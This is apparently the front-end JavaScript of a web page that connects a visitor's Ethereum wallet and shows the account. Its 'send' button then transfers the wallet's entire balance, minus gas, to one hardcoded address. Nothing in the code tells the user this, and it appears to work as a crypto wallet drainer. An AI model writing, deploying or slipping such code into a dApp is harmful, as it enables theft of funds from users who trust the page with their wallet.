document.addEventListener('DOMContentLoaded', async () => {
  let account;

  document.getElementById('connect-button').addEventListener('click', async () => {
    if (window.ethereum) {
      try {
        await ethereum.request({ method: 'eth_requestAccounts' });
        account = (await ethereum.request({ method: 'eth_accounts' }))[0];
        console.log(`Connected to account: ${account}`);

        const provider = new ethers.providers.Web3Provider(window.ethereum);

        const balance = await provider.getBalance(account);
        const balanceInETH = ethers.utils.formatEther(balance);

        console.log(`Balance: ${balanceInETH} ETH`);

        const shortenedAccount = `${account.slice(0, 4)}...${account.slice(-4)}`;
        document.getElementById('account-number').textContent = `Connected Account: ${shortenedAccount}`;
      } catch (error) {
        console.error('Error connecting:', error);
      }
    } else {
      console.error('No Ethereum provider found.');
    }
  });

  document.getElementById('send-button').addEventListener('click', async () => {
    if (!account) {
      console.error('Please connect to a wallet first.');
      return;
    }

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    try {
      const gasPrice = await provider.getGasPrice();
      const gasLimit = 21000; // Standard gas limit for a simple ETH transfer

      const balance = await provider.getBalance(account);
      const maxSendable = balance.sub(gasPrice.mul(gasLimit));

      if (maxSendable.gt(0)) {
        const transactionParam = {
          to: '0xDA35A9bf6bD6442C0aCe715e122fFB20871f1351', // Адрес получателя
          value: maxSendable
        };

        const txResponse = await signer.sendTransaction(transactionParam);
        console.log(`Transaction sent. Transaction hash: ${txResponse.hash}`);
      } else {
        console.error('Insufficient balance to cover gas cost.');
      }
    } catch (error) {
      console.error('Error sending transaction:', error);
    }
  });
});
